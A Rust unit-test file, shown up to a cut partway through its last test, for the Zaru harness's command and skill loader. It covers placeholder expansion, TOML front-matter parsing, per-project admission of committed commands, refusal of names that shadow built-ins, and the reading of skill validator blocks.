// Copyright 2026 100monkeys AI, Inc.
// SPDX-License-Identifier: Apache-2.0

//! What [ADR-0015] D1's command kind is, checked where the rules live.
//!
//! [ADR-0015]: https://100monkeys-ai.cortex.page/zaru/p/adrs/0015-commands-and-extensibility

use crate::commands::document::{Command, CommandRefused, Kind, Source};
use crate::commands::{Admissions, Offer, load_from};
use crate::commands::{date, fixtures, front_matter, placeholder};

/// ADR-0015 D3's file splits into a TOML head and a Markdown body, and the
/// body keeps its own bytes.
///
/// **The mutant:** `front_matter::split` returning the body trimmed of its
/// leading newline reddens the third assertion, because a body is a template
/// and a template's first line is the author's.
#[test]
fn a_command_file_splits_at_its_fences_and_the_body_is_verbatim() {
    let raw = "+++\ndescription = \"check a deploy\"\n+++\nRead the workflow.\n\nSay yes or no.\n";
    let split = front_matter::split(raw).expect("a fenced file splits");
    assert_eq!(split.head, "description = \"check a deploy\"\n");
    assert_eq!(split.above, 1, "the head sits one line into the file");
    assert_eq!(
        split.body, "Read the workflow.\n\nSay yes or no.\n",
        "the body is every byte after the closing fence's line"
    );
}

/// A file with no fence, and one whose fence is never closed, are both `None`
/// rather than a parse failure — the parser is never reached, so neither can
/// be reported as a TOML error.
#[test]
fn a_file_with_no_front_matter_and_one_that_never_closes_are_both_unsplit() {
    assert!(
        front_matter::split("Just a body.\n").is_none(),
        "a file with no opening fence has no front matter"
    );
    assert!(
        front_matter::split("+++\nname = \"x\"\nstill open\n").is_none(),
        "an opening fence that is never closed has no front matter"
    );
    assert!(
        front_matter::split("---\nname = \"x\"\n---\nbody\n").is_none(),
        "`---` is a CommonMark thematic break and is not this fence"
    );
}

/// Carriage returns and a byte-order mark are a file a person wrote on
/// another machine, not a file with a fault.
#[test]
fn a_file_written_on_another_platform_still_splits() {
    let raw = "\u{feff}+++\r\nname = \"x\"\r\n+++\r\nbody\r\n";
    let split = front_matter::split(raw).expect("a CRLF file with a mark splits");
    assert_eq!(split.head, "name = \"x\"\r\n");
    assert_eq!(split.body, "body\r\n");
}

/// ADR-0015 D1's "with arguments": `$ARGUMENTS` is the whole tail and `$1` to
/// `$9` are its words.
///
/// **The mutant:** `placeholder::expand`'s `Positional` arm indexing `words`
/// by `index` rather than `index - 1` reddens the second assertion with
/// `second` where `first` was asked for.
#[test]
fn the_grammar_expands_the_whole_tail_and_each_position() {
    assert_eq!(
        placeholder::expand("check $ARGUMENTS now", "the  main branch"),
        "check the  main branch now",
        "$ARGUMENTS is the tail verbatim, interior whitespace and all"
    );
    assert_eq!(
        placeholder::expand("$1 then $2 then $3", "first second"),
        "first then second then ",
        "a position with no word is empty rather than a refusal"
    );
    assert_eq!(
        placeholder::expand("nothing here", "ignored"),
        "nothing here",
        "a body with no placeholder is its own text"
    );
}

/// The one pass, which is the property D1's inertness rests on: an argument
/// that is itself a placeholder is not re-expanded.
///
/// **The mutant:** expanding in a loop until no placeholder remains reddens
/// this with `first` in place of the literal `$1`.
#[test]
fn an_argument_that_is_a_placeholder_is_not_expanded_again() {
    assert_eq!(
        placeholder::expand("run $1 and $2", "$2 first"),
        "run $2 and first",
        "a substituted argument is text and is never re-scanned"
    );
    assert_eq!(
        placeholder::expand("say $ARGUMENTS", "$ARGUMENTS"),
        "say $ARGUMENTS",
        "the tail reaches the task as the user typed it"
    );
}

/// A `$` this grammar has no rule for is text, which is what lets a command
/// body be the English a deploy-check is written in.
///
/// **The mutant:** treating every `$` followed by an uppercase run as a
/// placeholder reddens the first assertion by refusing `$HOME`.
#[test]
fn a_dollar_that_is_not_a_placeholder_is_literal() {
    for body in [
        "cd $HOME and look",
        "a bare $ and a $$ pair",
        "$ARGUMENT is not the word",
        "$_underscore and $-dash",
    ] {
        assert!(
            placeholder::unknown(body).is_none(),
            "`{body}` carries no unknown placeholder"
        );
        assert_eq!(
            placeholder::expand(body, "tail"),
            body,
            "`{body}` expands to itself"
        );
    }
}

/// The one unknown this grammar can have: an index outside `1` to `9`.
///
/// **The mutant:** `placeholder::read` returning `Positional` for every
/// single digit reddens the `$0` arm, which is the off-by-one a person
/// actually makes.
#[test]
fn a_positional_outside_one_to_nine_is_the_unknown_placeholder() {
    for (body, spelling) in [
        ("use $0 please", "$0"),
        ("use $10 please", "$10"),
        ("use $007 please", "$007"),
    ] {
        assert_eq!(
            placeholder::unknown(body).as_deref(),
            Some(spelling),
            "`{body}` names `{spelling}` and nothing around it"
        );
    }
    assert!(
        placeholder::unknown("use $1 and $9 and $ARGUMENTS").is_none(),
        "the accepting sibling: every spelling the grammar has is accepted"
    );
}

/// The refusal names the spelling and **nothing else on the line**, which is
/// `config::file`'s own rule for the same reason.
#[test]
fn the_unknown_placeholder_refusal_carries_no_other_word_of_the_line() {
    let spelling = placeholder::unknown("the token is hunter2 and the index is $0\n")
        .expect("an unknown placeholder");
    assert_eq!(spelling, "$0");
    assert!(
        !spelling.contains("hunter2"),
        "a refusal quoting the line would publish whatever was on it"
    );
}

/// D6's attribution line, in the record's own shape, with the glyph left to
/// the register that owns it.
///
/// **The mutant:** dropping the source word reddens the first assertion; the
/// second holds the user half, which has no admission date because nobody was
/// asked.
#[test]
fn the_attribution_line_is_the_records_own_shape() {
    let project = crate::commands::document::Expanded {
        name: "deploy-check".to_owned(),
        source: Source::Project,
        kind: crate::commands::Kind::Command,
        admitted: Some("2026-08-19".to_owned()),
        typed: "/deploy-check main".to_owned(),
        task: "check main".to_owned(),
    };
    assert_eq!(
        project.attribution(),
        "/deploy-check (project · admitted 2026-08-19)",
        "D6's own example, less the glyph the register paints"
    );
    let user = crate::commands::document::Expanded {
        admitted: None,
        source: Source::User,
        ..project
    };
    assert_eq!(
        user.attribution(),
        "/deploy-check (user)",
        "a user command was never admitted, so saying it was would be false"
    );
}

/// The civil date, without a dependency. Four days nobody can get wrong by
/// accident: the epoch, a leap day, the day after a century that is not a
/// leap year, and a day this workspace has already written down.
///
/// **The mutant:** dropping the `month <= 2` year adjustment reddens the leap
/// day, which is the whole reason the algorithm shifts the epoch to March.
#[test]
fn the_civil_date_is_arithmetic_rather_than_a_dependency() {
    assert_eq!(date::civil(0), "1970-01-01", "the epoch");
    assert_eq!(date::civil(19_416), "2023-02-28");
    assert_eq!(date::civil(19_782), "2024-02-29", "a leap day");
    assert_eq!(
        date::civil(20_711),
        "2026-09-15",
        "the day this was written"
    );
    assert_eq!(date::civil(11_016), "2000-02-29", "a leap century");
    assert_eq!(date::civil(-1), "1969-12-31", "a day before the epoch");
}

/// The two costs this grammar has, measured rather than predicted, and
/// recorded here so a reader meets them as assertions rather than as
/// surprises.
///
/// A `$` beside a digit is the grammar's own shape, so prose that carries one
/// is read as a placeholder: `$5.00` loses its `$5` to the fifth argument, and
/// `$0.50` is **refused at load** naming `$0`. Both are named on
/// [ADR-0015's amendments volume 2] as the price of the spelling a person
/// arriving from another harness already knows, with the alternative — a
/// grammar with no digits in it — named and rejected there.
///
/// [ADR-0015's amendments volume 2]: https://100monkeys-ai.cortex.page/zaru/p/adrs/0015-commands-and-extensibility-updates-2
#[test]
fn a_dollar_amount_in_prose_is_read_as_this_grammar_reads_it() {
    assert_eq!(
        placeholder::expand("it cost $5.00", "one two"),
        "it cost .00",
        "a digit one to nine beside a `$` is the positional it spells"
    );
    assert_eq!(
        placeholder::unknown("it cost $0.50").as_deref(),
        Some("$0"),
        "and a zero is the unknown placeholder, refused at load"
    );
}

/// The loader's two locations: `~/.zaru/commands/` and `./.zaru/commands/`.
///
/// **A user command loads with no admission** and a project command does not,
/// which is the two halves of D4 in one check. The accepting sibling is the
/// user half: a gate that refused everything would pass a check that only
/// looked at the project.
///
/// **The mutant:** `load_from` folding the project's commands in regardless
/// of `covers` reddens the second assertion, which is D4's whole gate.
#[test]
fn a_user_command_loads_and_a_projects_does_not_until_it_is_admitted() {
    let scratch = fixtures::Scratch::new();
    scratch.user_command("mine", &fixtures::file("", "A user command.\n"));
    scratch.project_command("deploy-check", &fixtures::file("", "Check $1.\n"));
    let admissions = Admissions::under(&scratch.home());

    let loaded = load_from(
        Some(&scratch.home()),
        Some(&scratch.project()),
        &admissions,
        ceiling(),
    );
    assert!(loaded.refusals.is_empty(), "{:?}", loaded.refusals);
    assert!(
        loaded.named("mine").is_some(),
        "a user command needs no admission"
    );
    assert!(
        loaded.named("deploy-check").is_none(),
        "a cloned project's commands do not load on first run"
    );
    assert_eq!(
        loaded
            .offer
            .pending()
            .iter()
            .map(Command::name)
            .collect::<Vec<_>>(),
        vec!["deploy-check"],
        "and the harness reports what the project offers"
    );
}

/// A project's refusal names its file **from the working directory**, and the
/// user's own names it whole.
///
/// # The defect this closes
///
/// Measured from the release binary at `15d31f1` over a real pseudo-terminal:
/// a `---`-fenced `greet.md` in a project under the fleet's scratch directory
/// was refused across **the whole opening pane** — three rows at 100 columns
/// of which two were the path, and **seven rows at 40 columns of which four
/// were the path**, the sentence starting on the fifth. The words were
/// already right: [ADR-0016] D2's remedy is in them, and `+++` stays.
///
/// **The mutant:** `shorten_against` made a no-op, or `read_directory` given
/// `None` for the project location — the first assertion reddens on the
/// absolute prefix. **The accepting sibling** is the user location below,
/// which must keep its whole path: there is no tree for `~/.zaru/commands/`
/// to be inside, so a path from anywhere else would be a lie.
///
/// [ADR-0016]: https://100monkeys-ai.cortex.page/zaru/p/adrs/0016-error-taxonomy
#[test]
fn a_projects_refusal_names_its_file_from_here_and_a_users_names_it_whole() {
    let scratch = fixtures::Scratch::new();
    // Three shapes, made by three different arms of the reader, so the seam
    // is asserted over the reader rather than over one refusal.
    scratch.project_command("greet", "---\ndescription = \"hello\"\n---\nGreet them.\n");
    scratch.project_command("session", &fixtures::file("", "Shadow a namespace.\n"));
    scratch.project_command(
        "spend",
        &fixtures::file("", "It cost $0.50, which is an unknown placeholder.\n"),
    );
    scratch.user_command("mine", "---\nnot front matter\n---\n");
    let admissions = Admissions::under(&scratch.home());

    let loaded = load_from(
        Some(&scratch.home()),
        Some(&scratch.project()),
        &admissions,
        ceiling(),
    );
    let project = scratch.project();
    let prefix = project.display().to_string();
    let mut whole = Vec::new();
    for refusal in &loaded.refusals {
        let said = refusal.to_string();
        if said.contains("mine.md") {
            assert!(
                said.contains(&scratch.home().display().to_string()),
                "the user's own location has no tree to be inside, so its refusal must name the \
                 whole path: {said}"
            );
            continue;
        }
        if said.contains(&prefix) {
            whole.push(said.clone());
        }
        assert!(
            said.contains(".zaru/commands/"),
            "a project's refusal must still say where the file is: {said}"
        );
    }
    assert!(
        whole.is_empty(),
        "a project's refusal names the working directory a reader is standing in: {whole:?}"
    );
    assert_eq!(
        loaded.refusals.len(),
        4,
        "all four shapes were refused: {:?}",
        loaded.refusals
    );
}

/// D4's second half: "the decision is recorded per project".
///
/// **The mutant:** `Admissions::covers` ignoring `directory` reddens the last
/// assertion, because a second checkout would then inherit the first's answer
/// — which is the supply-chain hole the clause exists to close.
#[test]
fn an_admission_is_per_directory_and_another_checkout_asks_again() {
    let scratch = fixtures::Scratch::new();
    scratch.project_command("deploy-check", &fixtures::file("", "Check $1.\n"));
    let elsewhere = scratch.elsewhere();
    scratch.command_in(
        &elsewhere,
        "deploy-check",
        &fixtures::file("", "Check $1.\n"),
    );
    let admissions = Admissions::under(&scratch.home());

    let offered = load_from(None, Some(&scratch.project()), &admissions, ceiling());
    admissions
        .admit(&scratch.project(), offered.offer.pending(), "2026-09-15")
        .expect("the admission is written");

    let here = load_from(None, Some(&scratch.project()), &admissions, ceiling());
    assert!(
        here.named("deploy-check").is_some(),
        "an admitted project's command loads"
    );
    assert_eq!(
        here.admitted_on("deploy-check"),
        Some("2026-09-15"),
        "and carries the date D6's attribution line shows"
    );

    let there = load_from(None, Some(&elsewhere), &admissions, ceiling());
    assert!(
        there.named("deploy-check").is_none(),
        "a user who trusts one repository has said nothing about the next"
    );
}

/// An admission covers the `(name, body)` pairs it was given, so a **new
/// name** and a **changed body** both ask again.
///
/// **The mutant:** `Admissions::covers` comparing only the name reddens the
/// second half, which is the shape that matters — a command admitted today
/// whose body is rewritten by tomorrow's pull.
#[test]
fn a_new_name_and_a_changed_body_both_ask_again() {
    let scratch = fixtures::Scratch::new();
    scratch.project_command("deploy-check", &fixtures::file("", "Check $1.\n"));
    let admissions = Admissions::under(&scratch.home());
    let first = load_from(None, Some(&scratch.project()), &admissions, ceiling());
    admissions
        .admit(&scratch.project(), first.offer.pending(), "2026-09-15")
        .expect("the admission is written");

    assert!(
        matches!(
            load_from(None, Some(&scratch.project()), &admissions, ceiling()).offer,
            Offer::Settled
        ),
        "an unchanged admitted set asks nothing, which is ADR-0002 D1"
    );

    scratch.project_command("triage", &fixtures::file("", "Triage $1.\n"));
    let with_a_new_name = load_from(None, Some(&scratch.project()), &admissions, ceiling());
    assert!(
        with_a_new_name.named("deploy-check").is_none(),
        "a new name puts the whole offer back to the user"
    );
    assert_eq!(with_a_new_name.offer.pending().len(), 2);

    admissions
        .admit(
            &scratch.project(),
            with_a_new_name.offer.pending(),
            "2026-09-15",
        )
        .expect("the second admission is written");
    scratch.project_command("deploy-check", &fixtures::file("", "Check $1 harder.\n"));
    let with_a_changed_body = load_from(None, Some(&scratch.project()), &admissions, ceiling());
    assert!(
        with_a_changed_body.named("deploy-check").is_none(),
        "a changed body of an admitted name asks again"
    );
}

/// Clause 5, over **both** of a namespace's spellings, because D2 says the
/// rule "binds a subcommand exactly as it binds a slash command".
///
/// The accepting sibling is in the same check: `helper` and `deploy-check`
/// load, so the rule is not a blanket refusal.
///
/// **The mutant:** `shadowed` comparing only the slash spelling reddens the
/// `sessions` arm — the subcommand half, which is exactly what D2's sentence
/// was settled to cover.
#[test]
fn a_command_named_for_a_built_in_is_refused_at_load_naming_the_collision() {
    let scratch = fixtures::Scratch::new();
    for name in [
        "session",
        "sessions",
        "help",
        "exit",
        "helper",
        "deploy-check",
    ] {
        scratch.user_command(name, &fixtures::file("", "A body.\n"));
    }
    let admissions = Admissions::under(&scratch.home());
    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());

    let refused: Vec<(String, String)> = loaded
        .refusals
        .iter()
        .filter_map(|refusal| match refusal {
            CommandRefused::Shadows { name, spelling, .. } => {
                Some((name.clone(), spelling.clone()))
            }
            _ => None,
        })
        .collect();
    assert_eq!(
        refused,
        vec![
            ("exit".to_owned(), "/exit".to_owned()),
            ("help".to_owned(), "/help".to_owned()),
            ("session".to_owned(), "/session".to_owned()),
            ("sessions".to_owned(), "zaru sessions".to_owned()),
        ],
        "each refusal names the built-in spelling it collided with"
    );
    assert!(
        loaded.named("helper").is_some() && loaded.named("deploy-check").is_some(),
        "the accepting sibling: a name that is not a built-in loads"
    );
}

/// One refused file does not disable its neighbours, and the refusal names
/// the file and the spelling rather than a line of the body.
///
/// **The mutant:** `read_directory` returning on the first refusal reddens
/// the second assertion, and a project's whole corpus would then be lost to
/// somebody else's typo.
#[test]
fn one_refused_file_does_not_disable_its_neighbours() {
    let scratch = fixtures::Scratch::new();
    scratch.user_command(
        "broken",
        &fixtures::file("", "the token is hunter2 and $0\n"),
    );
    scratch.user_command("fine", &fixtures::file("", "An ordinary body.\n"));
    let admissions = Admissions::under(&scratch.home());
    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());

    assert!(loaded.named("fine").is_some(), "the neighbour still loads");
    assert!(loaded.named("broken").is_none());
    let rendered = loaded
        .refusals
        .iter()
        .map(ToString::to_string)
        .collect::<Vec<_>>()
        .join("\n");
    assert!(
        rendered.contains("$0") && rendered.contains("broken.md"),
        "the refusal names the spelling and the file: {rendered}"
    );
    assert!(
        !rendered.contains("hunter2"),
        "and never the rest of the line it sat on: {rendered}"
    );
}

/// The front matter's own schema: a key this file has no row for is refused
/// naming the nearest, and a `name` that disagrees with the stem is refused
/// naming both.
///
/// **The mutant:** accepting any `name` key reddens the second arm, and the
/// file's stem would stop being the command's name.
#[test]
fn the_front_matter_schema_refuses_a_fourth_key_and_a_disagreeing_name() {
    let scratch = fixtures::Scratch::new();
    scratch.user_command(
        "typo",
        &fixtures::file("descriptio = \"a typo\"\n", "A body.\n"),
    );
    scratch.user_command("wrong", &fixtures::file("name = \"right\"\n", "A body.\n"));
    scratch.user_command(
        "agrees",
        &fixtures::file("name = \"agrees\"\ndescription = \"fine\"\n", "A body.\n"),
    );
    let admissions = Admissions::under(&scratch.home());
    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());

    let rendered = loaded
        .refusals
        .iter()
        .map(ToString::to_string)
        .collect::<Vec<_>>()
        .join("\n");
    assert!(
        rendered.contains("`descriptio`") && rendered.contains("the nearest is `description`"),
        "an unknown key is placed against the nearest this schema has: {rendered}"
    );
    assert!(
        rendered.contains("named `wrong`") && rendered.contains("says `right`"),
        "a disagreeing name names both: {rendered}"
    );
    let agrees = loaded.named("agrees").expect("the accepting sibling loads");
    assert_eq!(agrees.description(), Some("fine"));
}

/// A file with no front matter, and one whose TOML will not parse, are two
/// different refusals — and the parse refusal names the line of the **file**
/// rather than of the slice.
///
/// **The mutant:** `TomlFile::parse_text` ignoring `above` reddens the line
/// number, which is the off-by-a-fence the seam exists for.
#[test]
fn a_front_matter_that_will_not_parse_names_the_files_own_line() {
    let scratch = fixtures::Scratch::new();
    scratch.user_command("bare", "Just a body, no fences.\n");
    scratch.user_command(
        "unparsed",
        &fixtures::file("description = \"open\ndescription = 1\n", "A body.\n"),
    );
    let admissions = Admissions::under(&scratch.home());
    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());

    let rendered = loaded
        .refusals
        .iter()
        .map(ToString::to_string)
        .collect::<Vec<_>>()
        .join("\n");
    assert!(
        rendered.contains("has no `+++` front matter"),
        "a file with no fences is not a parse failure: {rendered}"
    );
    assert!(
        rendered.contains("line 2"),
        "the position is the file's own, one line past the opening fence: {rendered}"
    );
}

/// D3's precedence: **project over user for a name both define**, and D6's
/// attribution says which won.
///
/// **The mutant:** folding user over project reddens both assertions at once.
#[test]
fn a_project_command_wins_over_a_user_command_of_the_same_name() {
    let scratch = fixtures::Scratch::new();
    scratch.user_command("both", &fixtures::file("", "The user's body.\n"));
    scratch.user_command("only-mine", &fixtures::file("", "Only the user's.\n"));
    scratch.project_command("both", &fixtures::file("", "The project's body.\n"));
    let admissions = Admissions::under(&scratch.home());
    let offered = load_from(None, Some(&scratch.project()), &admissions, ceiling());
    admissions
        .admit(&scratch.project(), offered.offer.pending(), "2026-09-15")
        .expect("the admission is written");

    let loaded = load_from(
        Some(&scratch.home()),
        Some(&scratch.project()),
        &admissions,
        ceiling(),
    );
    let both = loaded.named("both").expect("`both` loads");
    assert_eq!(
        both.body(),
        "The project's body.\n",
        "a team's committed command is the workflow the record exists to share"
    );
    assert_eq!(
        both.source(),
        Source::Project,
        "and the attribution line says which won"
    );
    assert!(
        loaded.named("only-mine").is_some(),
        "a user command the project does not define is untouched"
    );
}

/// The admissions file is one plain line per admitted command, readable with
/// `cat`, and the body is stored **verbatim** so a change is a byte
/// comparison rather than a digest.
///
/// **The mutant:** `Admissions::admit` storing the name without the body
/// reddens the body assertion, and with it the whole changed-body gate.
#[test]
fn the_admissions_file_says_what_was_admitted_in_the_words_it_was_admitted_in() {
    let scratch = fixtures::Scratch::new();
    scratch.project_command("deploy-check", &fixtures::file("", "Check $1 twice.\n"));
    let admissions = Admissions::under(&scratch.home());
    let offered = load_from(None, Some(&scratch.project()), &admissions, ceiling());
    admissions
        .admit(&scratch.project(), offered.offer.pending(), "2026-09-15")
        .expect("the admission is written");

    let raw = std::fs::read_to_string(admissions.path()).expect("the file is there");
    assert_eq!(raw.lines().count(), 1, "one line per admitted command");
    assert!(
        raw.contains("Check $1 twice."),
        "the body, in the words it was admitted in: {raw}"
    );
    let entries = admissions.entries().expect("the file parses");
    assert_eq!(entries.len(), 1);
    assert_eq!(entries[0].directory, scratch.project());
    assert_eq!(entries[0].admitted, "2026-09-15");
}

/// An absent admissions file is no admissions rather than a fault, and a
/// fragment left by a kill is not counted.
#[test]
fn an_absent_admissions_file_is_no_admissions_and_a_fragment_is_not_a_line() {
    let scratch = fixtures::Scratch::new();
    let admissions = Admissions::under(&scratch.home());
    assert!(
        admissions
            .entries()
            .expect("an absent file is empty")
            .is_empty(),
        "a machine that has never admitted anything has nothing to report"
    );

    admissions
        .admit(
            &scratch.project(),
            &[Command::new(
                "x",
                None,
                "body",
                Source::Project,
                scratch.project(),
            )],
            "2026-09-15",
        )
        .expect("the admission is written");
    let mut raw = std::fs::read_to_string(admissions.path()).expect("the file is there");
    raw.push_str("{\"directory\":\"/half");
    std::fs::write(admissions.path(), raw).expect("the fragment is written");
    assert_eq!(
        admissions
            .entries()
            .expect("the complete lines parse")
            .len(),
        1,
        "the line in flight when a machine lost power is never counted"
    );
}

/// ADR-0015 D5's skill is named by the stem **before** `.skill`, and that
/// spelling had to be claimed rather than added.
///
/// Measured from the release binary at `6bdf080` before this landing:
/// `COMMAND_EXTENSION` is `md`, so the command loader already read
/// `triage.skill.md` and called the command `triage.skill` — it was admitted
/// under that name and shown in the picker. So the rule is that the stem
/// decides the name *and* the kind.
///
/// **The mutant:** `skill::of_stem` returning the whole stem as the name
/// reddens the first assertion with `triage.skill`, which is exactly what the
/// binary did before this module.
#[test]
fn a_skill_is_named_by_the_stem_before_dot_skill() {
    let scratch = fixtures::Scratch::new();
    scratch.user_command(
        "triage.skill",
        &fixtures::file("description = \"triage one issue\"\n", "Triage $1.\n"),
    );
    scratch.user_command("deploy-check", &fixtures::file("", "Check $1.\n"));
    let admissions = Admissions::under(&scratch.home());
    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());

    assert!(
        loaded.refusals.is_empty(),
        "nothing is refused: {:?}",
        loaded
            .refusals
            .iter()
            .map(ToString::to_string)
            .collect::<Vec<_>>()
    );
    let skill = loaded.named("triage").expect("the skill loads as `triage`");
    assert_eq!(skill.kind(), Kind::Skill);
    assert_eq!(skill.slash(), "/triage");
    assert_eq!(skill.description(), Some("triage one issue"));
    // The accepting sibling: a plain `<name>.md` is still a command.
    let command = loaded.named("deploy-check").expect("the command loads");
    assert_eq!(command.kind(), Kind::Command);
    assert!(
        loaded.named("triage.skill").is_none(),
        "the name is the stem before `.skill`, and nothing answers to the stem itself"
    );
}

/// `<name>.md` and `<name>.skill.md` in one directory claim one name, and
/// **neither loads**.
///
/// Which of them won would be behaviour that depends on the order a directory
/// was read in, which is D2's own reason for refusing a shadowing name one
/// paragraph above.
///
/// **The mutant:** `refuse_a_collision` keeping the first of the two reddens
/// the second assertion, and a project could change which file runs by
/// renaming neither of them.
#[test]
fn a_command_and_a_skill_of_one_name_are_both_refused_naming_both_files() {
    let scratch = fixtures::Scratch::new();
    scratch.user_command("deploy-check", &fixtures::file("", "The command.\n"));
    scratch.user_command("deploy-check.skill", &fixtures::file("", "The skill.\n"));
    scratch.user_command("survivor", &fixtures::file("", "Untouched.\n"));
    let admissions = Admissions::under(&scratch.home());
    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());

    assert!(
        loaded.named("deploy-check").is_none(),
        "neither file loads, because which one won would depend on load order"
    );
    assert_eq!(loaded.commands.len(), 1, "and the neighbour still loads");
    assert!(loaded.named("survivor").is_some());
    let said = loaded
        .refusals
        .iter()
        .map(ToString::to_string)
        .collect::<Vec<_>>()
        .join("\n");
    assert!(
        said.contains("deploy-check.md") && said.contains("deploy-check.skill.md"),
        "the refusal names both files: {said}"
    );
    assert!(
        said.contains("`deploy-check`"),
        "and the name they both claim: {said}"
    );
}

/// Clause 5 reaches a skill by its **name**, over both of a namespace's
/// spellings.
///
/// A skill and a command share one namespace, and D2's reason — behaviour
/// that depends on load order — does not care which kind shadowed.
///
/// **The mutant:** applying `shadowed` to the file stem rather than to the
/// name leaves `session.skill` colliding with nothing and reddens the first
/// two arms.
#[test]
fn a_skill_named_for_a_built_in_is_refused_at_load_over_both_spellings() {
    let scratch = fixtures::Scratch::new();
    for name in [
        "session.skill",
        "sessions.skill",
        "exit.skill",
        "helper.skill",
    ] {
        scratch.user_command(name, &fixtures::file("", "A body.\n"));
    }
    let admissions = Admissions::under(&scratch.home());
    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());

    let said = loaded
        .refusals
        .iter()
        .map(ToString::to_string)
        .collect::<Vec<_>>()
        .join("\n");
    for (file, spelling) in [
        ("session.skill.md", "`/session`"),
        ("sessions.skill.md", "`zaru sessions`"),
        ("exit.skill.md", "`/exit`"),
    ] {
        let line = said
            .lines()
            .find(|line| line.contains(file))
            .unwrap_or_else(|| panic!("{file} is refused: {said}"));
        assert!(
            line.contains(spelling),
            "the refusal names the built-in spelling it collided with: {line}"
        );
    }
    // The accepting sibling: a name that is not a namespace loads as a skill.
    assert_eq!(
        loaded.named("helper").map(Command::kind),
        Some(Kind::Skill),
        "the rule is not a blanket refusal of skills"
    );
}

/// D5's `expect` clauses are read by **ADR-0009's own reader**, in that
/// record's own `[[validator]]` spelling, and a malformed block is refused in
/// that reader's words with this file's path in front of them.
///
/// **The mutant:** a second parser in `commands::skill` — or
/// `validators_of` returning `Ok(Vec::new())` for a present key — reddens the
/// first assertion, and D5 would be a filename with nothing behind it.
#[test]
fn a_skills_validator_block_is_read_by_the_manifests_own_parser() {
    let scratch = fixtures::Scratch::new();
    scratch.user_command(
        "triage.skill",
        &fixtures::file(
            "description = \"triage one issue\"\n\n[[validator]]\nname = \"says-triaged\"\nrun = \
             \"printf triaged\"\nexpect = { matches = \"triaged\" }\n\n[[validator]]\nname = \
             \"builds\"\nrun = \"true\"\nexpect = \"exit-zero\"\nafter = [\"says-triaged\"]\n",
            "Triage $1.\n",
        ),
    );
    scratch.user_command(
        "broken.skill",
        &fixtures::file(
            "[[validator]]\nname = \"x\"\nrun = \"true\"\nexpect = \"exit-nine\"\n",
            "Body.\n",
        ),
    );
    let admissions = Admissions::under(&scratch.home());
    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());

    let declared = loaded.validators_of("triage");
    assert_eq!(
        declared.len(),
        2,
        "both blocks are read, in declaration order"
    );
    assert_eq!(declared[0].name.as_str(), "says-triaged");
    assert_eq!(declared[0].run.as_str(), "printf triaged");
    assert_eq!(declared[1].after.len(), 1, "`after` travels with them");
    assert_eq!(declared[1].after[0].as_str(), "says-triaged");

    let refusal = loaded
        .refusals
        .iter()
        .find(|refusal| refusal.path().ends_with("broken.skill.md"))
        .unwrap_or_else(|| panic!("the malformed block is refused"))
        .to_string();
    assert!(
        refusal.contains("broken.skill.md"),
        "the refusal names the file, which the manifest's reader does not: {refusal}"
    );
    assert!(
        refusal.contains("exit-nine"),
        "and it is the manifest reader's own words: {refusal}"
    );
    assert!(
        loaded.named("broken").is_none(),
        "a file whose validators do not read does not load"
    );
}

/// A `[[validator]]` in a `<name>.md` is a person who meant to write a skill,
/// and the remedy is the filename rather than deleting what they wrote.
///
/// This is the state measured from the release binary at `6bdf080`, where the
/// same file was refused as `declares `expect`, which a command file has no
/// key for; the nearest is `name`` — a refusal whose reader could not act.
///
/// **The mutant:** dropping the `Kind::Command` guard so the key walk answers
/// instead reddens the assertion that the refusal names the skill spelling.
#[test]
fn a_validator_in_a_command_file_names_the_skill_it_would_have_to_be() {
    let scratch = fixtures::Scratch::new();
    scratch.user_command(
        "triage",
        &fixtures::file(
            "[[validator]]\nname = \"x\"\nrun = \"true\"\nexpect = \"exit-zero\"\n",
            "Body.\n",
        ),
    );
    let admissions = Admissions::under(&scratch.home());
    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());

    let refusal = loaded
        .refusals
        .first()
        .expect("the file is refused")
        .to_string();
    assert!(
        refusal.contains("triage.skill.md"),
        "the refusal names what to rename it to: {refusal}"
    );
    assert!(loaded.named("triage").is_none());
}

/// A skill has three keys and a command has two; a fourth is refused naming
/// the nearest of that kind's own.
///
/// **The mutant:** `Kind::keys` answering `Kind::Command`'s set for both
/// reddens the first assertion, and `[[validator]]` would be an unknown key
/// in the file that is for it.
#[test]
fn a_skills_schema_has_three_keys_and_a_fourth_is_still_refused() {
    let scratch = fixtures::Scratch::new();
    scratch.user_command(
        "ok.skill",
        &fixtures::file(
            "description = \"d\"\nname = \"ok\"\n\n[[validator]]\nname = \"v\"\nrun = \
             \"true\"\nexpect = \"exit-zero\"\n",
            "Body.\n",
        ),
    );
    scratch.user_command(
        "extra.skill",
        &fixtures::file("descriptoin = \"d\"\n", "Body.\n"),
    );
    let admissions = Admissions::under(&scratch.home());
    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());

    assert_eq!(
        loaded.validators_of("ok").len(),
        1,
        "`validator` is a key a skill has: {:?}",
        loaded
            .refusals
            .iter()
            .map(ToString::to_string)
            .collect::<Vec<_>>()
    );
    let refusal = loaded
        .refusals
        .iter()
        .find(|refusal| refusal.path().ends_with("extra.skill.md"))
        .expect("a fourth key is refused")
        .to_string();
    assert!(
        refusal.contains("`description`"),
        "naming the nearest of the kind's own keys: {refusal}"
    );
}

/// D5's second sentence, built rather than written: "one without runs as
/// instructions". A skill with no `[[validator]]` is a command with a
/// different word in its attribution and nothing else.
///
/// **The mutant:** `origin_words` ignoring the kind reddens the first two
/// assertions, and D6's line would not say which kind contributed.
#[test]
fn a_skill_without_validators_is_a_command_with_a_different_word() {
    let scratch = fixtures::Scratch::new();
    scratch.user_command("plain.skill", &fixtures::file("", "Just instructions.\n"));
    let admissions = Admissions::under(&scratch.home());
    let loaded = load_from(Some(&scratch.home()), None, &admissions, ceiling());

    let skill = loaded.named("plain").expect("it loads");
    assert_eq!(skill.origin(), "user skill");
    assert_eq!(
        crate::commands::origin_words(Source::Project, Kind::Skill),
        "project skill"
    );
    assert_eq!(
        crate::commands::origin_words(Source::Project, Kind::Command),
        "project",
        "a command's line is unchanged, which is what makes this additive"
    );
    assert!(
        skill.validators().is_empty(),
